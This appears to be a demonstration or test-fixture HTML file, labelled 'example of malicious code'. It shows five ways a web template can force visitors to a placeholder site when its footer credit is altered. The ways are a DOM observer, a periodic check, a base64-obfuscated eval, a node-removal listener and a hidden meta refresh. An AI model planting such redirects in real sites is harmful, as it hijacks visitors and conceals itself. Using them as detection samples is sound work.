@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Example: Malicious Redirect Code</title>
+</head>
+<body>
+    <h1>This is an EXAMPLE of malicious code</h1>
+    <p>DO NOT use this file - it's for demonstration only!</p>
+    
+    <footer id="site-footer">
+        <p class="footer-credit">Template by SomeAuthor</p>
+    </footer>
+
+    <!-- EXAMPLE 1: DOM Mutation Observer that redirects on footer changes -->
+    <script>
+        var observer = new MutationObserver(function(mutations) {
+            mutations.forEach(function(mutation) {
+                if (mutation.type === 'childList' || mutation.type === 'characterData') {
+                    // Malicious redirect
+                    window.location.href = "http://malicious-template-site.com";
+                }
+            });
+        });
+        
+        var footer = document.getElementById('site-footer');
+        if (footer) {
+            observer.observe(footer, {
+                childList: true,
+                subtree: true,
+                characterData: true
+            });
+        }
+    </script>
+
+    <!-- EXAMPLE 2: Periodic check for footer credit presence -->
+    <script>
+        setInterval(function() {
+            var credit = document.querySelector('.footer-credit');
+            if (!credit || credit.textContent.indexOf('SomeAuthor') === -1) {
+                location.replace('http://malicious-template-site.com');
+            }
+        }, 2000);
+    </script>
+
+    <!-- EXAMPLE 3: Obfuscated redirect code -->
+    <script>
+        // This is base64 encoded malicious code
+        eval(atob('d2luZG93LmxvY2F0aW9uLmhyZWY9Imh0dHA6Ly9tYWxpY2lvdXMtc2l0ZS5jb20i'));
+    </script>
+
+    <!-- EXAMPLE 4: DOM event listener for removal -->
+    <script>
+        document.addEventListener('DOMNodeRemoved', function(e) {
+            if (e.target.className === 'footer-credit') {
+                window.location = 'http://malicious-template-site.com';
+            }
+        });
+    </script>
+
+    <!-- EXAMPLE 5: Hidden meta refresh -->
+    <meta http-equiv="refresh" content="5;url=http://malicious-template-site.com" style="display:none">
+</body>
+</html>
